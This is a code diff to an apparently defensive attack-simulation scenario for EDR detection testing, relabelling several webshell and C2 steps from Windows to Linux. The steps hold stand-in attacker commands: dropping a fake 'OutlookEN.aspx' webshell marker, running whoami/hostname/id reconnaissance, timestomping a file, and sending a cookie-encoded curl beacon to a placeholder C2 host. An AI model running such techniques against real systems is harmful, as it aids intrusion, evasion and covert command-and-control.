@@ -100,7 +100,10 @@ steps:
     command: "mkdir -p \"${WEBROOT:-/var/www/html}\"; printf '%s\\n' '<%-- CortexSim SAFE-MODE marker SIM-EDR-014 NET-STAR OutlookEN.aspx --%>' > \"${WEBROOT:-/var/www/html}/OutlookEN.aspx\"; echo cortexsim-edr-014-webshell-dropped"
     identity: www-data
     mitre_technique: "T1505.003"
-    platforms: ["windows"]
+    # TODO(windows-variant, CONT-06): the TTP is Windows-native, but this
+    # step's command is a POSIX SAFE-MODE stand-in, so it is labelled with
+    # the OS it actually runs on until a real platform_variants.windows exists.
+    platforms: ["linux"]
     expected_detections:
       - plane: EDR
         type: BIOC
@@ -118,7 +121,10 @@ steps:
     command: "whoami; hostname; id; echo cortexsim-edr-014-w3wp-command-lineage-and-reflective-load"
     identity: www-data
     mitre_technique: "T1620"
-    platforms: ["windows"]
+    # TODO(windows-variant, CONT-06): the TTP is Windows-native, but this
+    # step's command is a POSIX SAFE-MODE stand-in, so it is labelled with
+    # the OS it actually runs on until a real platform_variants.windows exists.
+    platforms: ["linux"]
     causality:
       parent_step: step-01
       pivot: process_lineage
@@ -149,7 +155,10 @@ steps:
     command: "touch -t 202001010000.00 \"${WEBROOT:-/var/www/html}/OutlookEN.aspx\" 2>/dev/null || true; echo cortexsim-edr-014-amsi-clr-coload-and-timestomp"
     identity: www-data
     mitre_technique: "T1562.001"
-    platforms: ["windows"]
+    # TODO(windows-variant, CONT-06): the TTP is Windows-native, but this
+    # step's command is a POSIX SAFE-MODE stand-in, so it is labelled with
+    # the OS it actually runs on until a real platform_variants.windows exists.
+    platforms: ["linux"]
     causality:
       parent_step: step-02
       pivot: process_lineage
@@ -170,7 +179,10 @@ steps:
     command: "curl -s --max-time 5 -H 'Cookie: sid=R2ppcA==STARQUJD==STARUEtDUzc=' \"http://${C2_HOST:-127.0.0.1}/owa/OutlookEN.aspx\" -o /dev/null 2>/dev/null || true; echo cortexsim-edr-014-star-cookie-c2"
     identity: www-data
     mitre_technique: "T1071.001"
-    platforms: ["windows"]
+    # TODO(windows-variant, CONT-06): the TTP is Windows-native, but this
+    # step's command is a POSIX SAFE-MODE stand-in, so it is labelled with
+    # the OS it actually runs on until a real platform_variants.windows exists.
+    platforms: ["linux"]
     causality:
       parent_step: step-02
       pivot: network_session
@@ -186,7 +198,10 @@ steps:
     command: "echo cortexsim-edr-014-cr-edr-0014-stitched-net-star-incident"
     identity: www-data
     mitre_technique: "T1505.003"
-    platforms: ["windows"]
+    # TODO(windows-variant, CONT-06): the TTP is Windows-native, but this
+    # step's command is a POSIX SAFE-MODE stand-in, so it is labelled with
+    # the OS it actually runs on until a real platform_variants.windows exists.
+    platforms: ["linux"]
     causality:
       parent_step: step-04
       pivot: shared_entity
